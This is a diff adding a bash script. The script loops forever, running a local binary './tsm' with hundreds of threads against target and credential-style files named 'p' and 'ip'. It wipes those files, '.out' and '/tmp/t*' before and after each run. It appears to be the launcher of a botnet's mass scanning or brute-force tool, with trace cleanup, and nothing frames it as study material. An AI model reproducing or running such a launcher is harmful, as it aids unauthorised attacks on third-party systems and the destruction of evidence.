@@ -1,0 +1,35 @@
+#!/bin/bash
+dir=`pwd`
+cd $dir
+
+threads=515
+
+ARCH=`uname -m`
+if [[ "$ARCH" =~ ^arm ]]; then
+	threads=75
+fi
+
+
+
+		while :
+		do
+		touch v
+		rm -rf p
+		rm -rf ip
+		rm -rf xtr*
+		rm -rf a a.*
+		rm -rf b b.*
+		
+		sleep $[ ( $RANDOM % 30 )  + 1 ]s
+		timeout 3h ./tsm -t $threads -f 1 -s 12 -S 10 -p 0 -d 1 p ip
+
+		sleep 3
+		rm -rf xtr*
+		rm -rf ip
+		rm -rf p
+		rm -rf .out
+		rm -rf /tmp/t*
+		done
+exit 0
+
+
